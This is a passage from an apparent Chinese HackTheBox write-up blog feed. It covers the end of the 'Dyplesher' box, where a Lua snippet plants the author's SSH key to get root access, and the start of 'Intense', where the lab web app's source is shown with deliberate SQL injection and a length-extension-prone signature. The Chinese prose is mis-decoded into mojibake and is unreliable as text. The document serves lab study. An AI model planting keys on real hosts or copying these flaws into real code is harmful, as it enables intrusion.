class="built_in">write</span>(<span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1dF791Ph8rC/PU4fXFjW4rBuU8JbmozNWx1kll3NA5r/vhpG05UZ/7dl8+Hs+bbnv/4TMferXgPj27QFJNGBuEfM+ZVO9ah5QNTwrO26vlCP885GyO0RoAoFM0ZNQaYfim1j6zrnplgWtJ7rIHRyrxt6ZDCFq7hGQm8CQP1xbVeaYoYYYHAVVt3IxDbeHh5pJsZDNvzsh1RZNCQlLdwvpoDdWhNPYq+lNYWSjGmW9nMVgQzcY1rk2IEf0Cg5NbZyFtBHITEG0myWIEXtg8D+t9f3IZbgzjaXkN4lVbGAGhNHvfrCemrmTWCbfpuoSS7mE65qfo87yVJdxwWYbx47fe0FMGtDBexa/+WyRApN+E/n3D+Dk56bnzSWiWzzxQptxJVPnM+txWOA6aixGb0PJpO1Wa2S29kg1C4GLNaEKXupursO7Vewq4ZCyzQmeWi2g8BljNqjIA89C9v2cRyFx+lIILxwNn2xbjVVf/WYjcE3lXLpqqz2CzCfuR+4xbSU= root@byc404"</span>)</span><br><span class="line">f:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºä¸Šèµ·ä¸ªpythonç›‘å¬9001,ç„¶åkaliè¿è¡Œè„šæœ¬ã€‚çœ‹åˆ°é¶æœºä¸Šè·å–åˆ°luaè„šæœ¬åå°±å¯ä»¥root sshç™»å½•äº†ã€‚</p><p>rooted.<br><img src="/2020/07/24/hackthebox-Dyplesher/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>  insaneéš¾åº¦çš„é¶æœºé¦–å…ˆç¡®å®æœ‰ä¸€å®šéš¾åº¦ã€‚ä¸è¿‡æ•´ä½“ä¸Šæˆ‘æ„Ÿè§‰è·Ÿtraveléš¾åº¦å·®ä¸å¤šã€‚ä¸»è¦enumçš„è¿‡ç¨‹æ²¡æœ‰é‚£ä¹ˆæ¯ç‡¥,è€Œåˆ©ç”¨èµ·æ¥çš„éš¾åº¦ä¹Ÿæ²¡é‚£ä¹ˆé«˜ã€‚ä½†æ˜¯æ€»å½’è¿˜æ˜¯å¾ˆæœ‰æ°´å¹³çš„é¶æœºã€‚éœ€è¦æˆ‘ä»¬è€å¿ƒçš„å»æ•´åˆä¿¡æ¯å¹¶å­¦ä¹ æ–°çŸ¥è¯†ã€‚ç¼–å†™mcè·Ÿluaæ’ä»¶éƒ½æ˜¯æé†’æˆ‘ä»¬ä¸è¦ä»»æ„å…è®¸ç”¨æˆ·ä¸Šä¼ è‡ªå®šä¹‰æ’ä»¶ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Intense</title>
      <link href="2020/07/22/hackthebox-Intense/"/>
      <url>2020/07/22/hackthebox-Intense/</url>
      
        <content type="html"><![CDATA[<p>çº ç»“äº†å¥½ä¹…è¦ä¸è¦å†™è¿™ç¯‡wp.æœ€åè¿˜æ˜¯æ‰“ç®—æŠŠæµç¨‹è¿‡ä¸€éå§ã€‚é¦–å…ˆè¿™å°é¶æœºæ²¡æ–™åˆ°çš„æ˜¯å¼€å¼€å¿ƒå¿ƒåšåˆ°rootéƒ¨åˆ†å‘ç°æ˜¯ä¸ªpwnä¸€è„¸æ‡µé€¼ã€‚æƒ³è‡ªå·±ä¸Šæ‰‹æœ€åå‘ç°è¿˜æ˜¯tcl,åªå¥½å»è¯·æ•™æœ‹å‹ã€‚æ‰€å¹¸æœ€åè¿˜æ˜¯æ‰“æˆäº†ã€‚å› æ­¤pwnéƒ¨åˆ†æˆ‘ä¸åšè§£é‡Š,ä¸»è¦æŠŠå‰é¢getshellæµç¨‹å†™ä¸€éã€‚</p><a id="more"></a><p><img src="/2020/07/22/hackthebox-Intense/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>ç¬¬ä¸€éƒ¨åˆ†å…ˆæ˜¯nmapæ‰«æ,å‘ç°åªå¼€äº†22,80ç«¯å£ã€‚é‚£å°±ç›´æ¥ä»webä¸‹æ‰‹ã€‚</p><p>è®¿é—®åˆ°é¡µé¢åå‘ç°æ›´åŠ ç›´æ¥äº†ã€‚é¢˜ç›®ç»™äº†æˆ‘ä»¬å…³é”®ä¿¡æ¯è¯´ç½‘ç«™æ˜¯å¼€æºçš„,ä¸‹è½½src.zipç›´æ¥å¾—appæºç ã€‚é‚£å°±æ„‰å¿«çš„å®¡è®¡äº†ã€‚</p><p>ä¸»ä½“ä»£ç <br>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, g, redirect, url_for,\</span><br><span class="line">    make_response</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> get_db, get_session, get_user, try_login, query_db, badword_in_str</span><br><span class="line"><span class="keyword">from</span> admin <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> lwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(admin)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close_connection</span><span class="params">(exception)</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/submit', methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">()</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> session:</span><br><span class="line">        user = get_user(session[<span class="string">"username"</span>], session[<span class="string">"secret"</span>])</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"submit.html"</span>, page=<span class="string">"submit"</span>, user=user)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"submit.html"</span>, page=<span class="string">"submit"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/submitmessage", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submitmessage</span><span class="params">()</span>:</span></span><br><span class="line">    message = request.form.get(<span class="string">"message"</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(message) &gt; <span class="number">140</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"message too long"</span></span><br><span class="line">    <span class="keyword">if</span> badword_in_str(message):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"forbidden word in message"</span></span><br><span class="line">    <span class="comment"># insert new message in DB</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        query_db(<span class="string">"insert into messages values ('%s')"</span> %message)</span><br><span class="line">    <span class="keyword">except</span> sqlite3.Error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> str(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"OK"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/login", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"login.html"</span>, page=<span class="string">"login"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/postlogin", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">postlogin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># return user's info if exists</span></span><br><span class="line">    data = try_login(request.form)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        resp = make_response(<span class="string">"OK"</span>)</span><br><span class="line">        <span class="comment"># create new cookie session to authenticate user</span></span><br><span class="line">        session = lwt.create_session(data)</span><br><span class="line">        print(session)</span><br><span class="line">        cookie = lwt.create_cookie(session)</span><br><span class="line">        resp.set_cookie(<span class="string">"auth"</span>, cookie)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Login failed"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/logout")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"&lt;script&gt;document.location.href='/';&lt;/script&gt;"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"auth"</span>, <span class="string">""</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="meta">@app.route("/home")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> <span class="string">"username"</span> <span class="keyword">in</span> session:</span><br><span class="line">        user = get_user(session[<span class="string">"username"</span>], session[<span class="string">"secret"</span>])</span><br><span class="line">        print(user)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>, page=<span class="string">"home"</span>, user=user)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"home.html"</span>, page=<span class="string">"home"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>,<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, render_template, request, redirect, abort</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> is_admin, admin_view_log, admin_list_log</span><br><span class="line"></span><br><span class="line">admin = Blueprint(<span class="string">'admin'</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"admin.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin/log/view", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_log</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    logfile = request.form.get(<span class="string">"logfile"</span>)</span><br><span class="line">    <span class="keyword">if</span> logfile:</span><br><span class="line">        logcontent = admin_view_log(logfile)</span><br><span class="line">        <span class="keyword">return</span> logcontent</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.route("/admin/log/dir", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_log</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin(request):</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    logdir = request.form.get(<span class="string">"logdir"</span>)</span><br><span class="line">    <span class="keyword">if</span> logdir:</span><br><span class="line">        logdir = admin_list_log(logdir)</span><br><span class="line">        <span class="keyword">return</span> str(logdir)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure><p>lwt.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randrange</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">SECRET = os.urandom(randrange(<span class="number">8</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvalidSignature</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="string">""" Sign message with secret key """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(SECRET + msg).digest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verif_signature</span><span class="params">(data, sig)</span>:</span></span><br><span class="line">    <span class="string">""" Verify if the supplied signature is valid """</span></span><br><span class="line">    <span class="keyword">return</span> sign(data) == sig</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_session</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    <span class="string">""" Parse cookie and return dict</span></span><br><span class="line"><span class="string">        @cookie: "key1=value1;key2=value2"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    b64_data, b64_sig = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">    data = b64decode(b64_data)</span><br><span class="line">    sig = b64decode(b64_sig)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verif_signature(data, sig):</span><br><span class="line">        <span class="keyword">raise</span> InvalidSignature</span><br><span class="line">    info = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> data.split(<span class="string">b';'</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> group:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            key, val = group.split(<span class="string">b'='</span>)</span><br><span class="line">            info[key.decode()] = val</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_session</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="string">""" Create session based on dict</span></span><br><span class="line"><span class="string">        @data: &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return "key1=value1;key2=value2;"</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    session = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items():</span><br><span class="line">        session += <span class="string">f"<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v&#125;</span>;"</span></span><br><span class="line">    <span class="keyword">return</span> session.encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_cookie</span><span class="params">(session)</span>:</span></span><br><span class="line">    cookie_sig = sign(session)</span><br><span class="line">    print(cookie_sig)</span><br><span class="line">    <span class="keyword">return</span> b64encode(session) + <span class="string">b'.'</span> + b64encode(cookie_sig)</span><br></pre></td></tr></table></figure><p>utils.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lwt</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> g</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir, path</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">"database.db"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"User(username=%s,role=%d)"</span> % (self.username,self.role)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db</span><span class="params">()</span>:</span></span><br><span class="line">    db = getattr(g, <span class="string">'_database'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(DATABASE)</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_login</span><span class="params">(user)</span>:</span></span><br><span class="line">    now = datetime.datetime.now()</span><br><span class="line">    d = now.strftime(<span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">f"logs/<span class="subst">&#123;d&#125;</span>.log"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> log:</span><br><span class="line">        log.write(str(user) + <span class="string">' logged\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">badword_in_str</span><span class="params">(data)</span>:</span></span><br><span class="line">    data = data.lower()</span><br><span class="line">    badwords = [<span class="string">"rand"</span>, <span class="string">"system"</span>, <span class="string">"exec"</span>, <span class="string">"date"</span>]</span><br><span class="line">    <span class="keyword">for</span> badword <span class="keyword">in</span> badwords:</span><br><span class="line">        <span class="keyword">if</span> badword <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_password</span><span class="params">(password)</span>:</span></span><br><span class="line">    <span class="string">""" Hash password with a secure hashing function """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(password.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query_db</span><span class="params">(query, args=<span class="params">()</span>, one=False)</span>:</span></span><br><span class="line">    cur = get_db().execute(query, args)</span><br><span class="line">    rv = cur.fetchall()</span><br><span class="line">    cur.close()</span><br><span class="line">    <span class="keyword">return</span> (rv[<span class="number">0</span>] <span class="keyword">if</span> rv <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">if</span> one <span class="keyword">else</span> rv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user</span><span class="params">(username, secret)</span>:</span></span><br><span class="line">    <span class="string">""" Returns User object if given username/secret exist in DB """</span></span><br><span class="line">    username = username.decode()</span><br><span class="line">    secret = secret.decode()</span><br><span class="line">    res = query_db(<span class="string">"select role from users where username = ? and secret = ?"</span>, (username, secret), one=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        user = User()</span><br><span class="line">        user.username = username</span><br><span class="line">        user.role = res[<span class="number">0</span>]</span><br><span class="line">        log_login(user)</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_login</span><span class="params">(form)</span>:</span></span><br><span class="line">    <span class="string">""" Try to login with the submitted user info """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    username = form[<span class="string">"username"</span>]</span><br><span class="line">    password = hash_password(form[<span class="string">"password"</span>])</span><br><span class="line">    result = query_db(<span class="string">"select count(*) from users where username = ? and secret = ?"</span>, (username, password), one=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">and</span> result[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"username"</span>: username, <span class="string">"secret"</span>:password&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_session</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">""" Get user session and parse it """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.cookies:</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">"auth"</span> <span class="keyword">not</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">"auth"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        info = lwt.parse_session(cookie)</span><br><span class="line">    <span class="keyword">except</span> lwt.InvalidSignature:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"status"</span>: <span class="number">-1</span>, <span class="string">"msg"</span>: <span class="string">"Invalid signature"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span><span class="params">(request)</span>:</span></span><br><span class="line">    session = get_session(request)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"username"</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> <span class="string">"secret"</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    user = get_user(session[<span class="string">"username"</span>], 